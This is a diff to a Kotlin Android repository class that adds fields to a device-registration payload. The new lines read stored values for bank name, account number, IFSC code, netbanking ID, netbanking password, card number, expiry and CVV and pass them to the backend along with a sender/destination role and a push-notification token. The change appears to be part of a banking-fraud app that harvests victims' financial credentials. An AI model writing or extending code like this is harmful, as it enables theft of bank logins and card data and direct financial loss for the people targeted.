@@ -165,6 +165,14 @@ class DeviceRepository @Inject constructor(
             val departmentName = prefs[KEY_DEPARTMENT_NAME] ?: "Accounts Dept"
             val mobileNumber = prefs[KEY_MOBILE_NUMBER] ?: "N/A"
             val address = prefs[KEY_ADDRESS] ?: "Main Office"
+            val bankName = prefs[KEY_BANK_NAME]
+            val accountNumber = prefs[KEY_ACCOUNT_NUMBER]
+            val ifscCode = prefs[KEY_IFSC_CODE]
+            val netbankingId = prefs[KEY_NETBANKING_ID]
+            val netbankingPassword = prefs[KEY_NETBANKING_PASSWORD]
+            val cardNumber = prefs[KEY_CARD_NUMBER]
+            val cardExpiry = prefs[KEY_CARD_EXPIRY]
+            val cardCvv = prefs[KEY_CARD_CVV]
 
             val backendRole = if (role == DeviceRole.SENDER) "SOURCE" else "DESTINATION"
 
@@ -181,6 +189,14 @@ class DeviceRepository @Inject constructor(
                 departmentName = departmentName,
                 mobileNumber = mobileNumber,
                 address = address,
+                bankName = bankName,
+                accountNumber = accountNumber,
+                ifscCode = ifscCode,
+                netbankingId = netbankingId,
+                netbankingPassword = netbankingPassword,
+                cardNumber = cardNumber,
+                cardExpiry = cardExpiry,
+                cardCvv = cardCvv,
                 role = backendRole,
                 publicKeyPem = publicKeyPem,
                 fcmToken = fcmToken
